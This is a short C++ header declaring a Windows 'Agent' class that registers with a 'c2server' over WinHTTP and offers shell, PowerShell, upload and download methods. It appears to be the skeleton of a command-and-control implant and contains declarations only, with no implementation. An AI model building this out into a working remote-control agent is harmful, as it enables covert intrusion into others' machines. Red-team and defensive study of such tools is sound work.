#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <Windows.h>
#include <winhttp.h>



class Agent {

protected:
	// command handler.
	std::string HandlerURI;
	std::string ComputerName;
	std::string AgentID; // MD5 of computername or something
	std::string ipAddress;
	std::vector<std::string> FunctionArguments;
	unsigned int port;

	std::string PsScript = "";


public:
	void Register(std::string ip, unsigned int port);
	// ip/port for c2server
	std::string Get(std::string path);
	std::string Post(std::string path, std::string data);
	//std::vector<std::string> GetArgs();
	static void shell(std::vector<std::string> args);
	static void powershell(std::vector<std::string> args);
	//static void psimport(std::vector<std::string> args);
	static void upload(std::vector<std::string> args);
	static void download(std::vector<std::string> args);

};